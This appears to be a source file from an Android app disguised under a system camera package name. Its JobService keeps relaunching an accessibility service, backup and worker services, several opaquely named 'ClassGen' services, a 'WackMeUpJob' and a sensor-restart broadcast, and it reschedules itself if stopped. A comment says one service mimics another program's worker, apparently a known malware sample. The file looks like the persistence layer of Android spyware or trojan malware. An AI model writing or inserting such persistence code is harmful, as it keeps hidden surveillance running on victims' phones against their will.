package com.android.photo.camera.capture;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * Dedicated JobService for scheduled service monitoring and restarts
 */
public class MonitorJobService extends JobService {
    private static final String TAG = "MonitorJobService";

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "Job started");

        // Start in foreground with notification
        ForegroundServiceHelper.startForeground(this, 1008,
                "Service Monitor", "Monitoring service status");

        // Check if our services are running and start them if not
        ensureServicesRunning();

        // Return false as our job is not doing ongoing work
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        // Return true to reschedule this job if it's stopped unexpectedly
        return true;
    }

    private void ensureServicesRunning() {
        try {
            // Start main accessibility service
            startService(Service.class);

            // Start backup service
            startService(BackupService.class);

            // Start worker service (mimics _srv_worker_)
            startService(WorkerService.class);

            // Start ClassGen5 service
            startService(ClassGen5Service.class);

            // Start ClassGen6 service
            startService(ClassGen6Service.class);

            // Start ClassGen11 service
            startService(ClassGen11Service.class);

            // Start MyWorker service
            startService(MyWorkerService.class);

            // Schedule WackMeUpJob
            WackMeUpJob.scheduleJob(this);

            // Trigger SensorRestarterBroadcastReceiver
            Intent restartIntent = new Intent("RestartSensor");
            sendBroadcast(restartIntent);

            Log.d(TAG, "Services started from job");
        } catch (Exception e) {
            Log.e(TAG, "Error starting services from job", e);
        }
    }

    private void startService(Class<?> serviceClass) {
        try {
            Intent serviceIntent = new Intent(this, serviceClass);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "Started " + serviceClass.getSimpleName());
        } catch (Exception e) {
            Log.e(TAG, "Error starting " + serviceClass.getSimpleName(), e);
        }
    }
}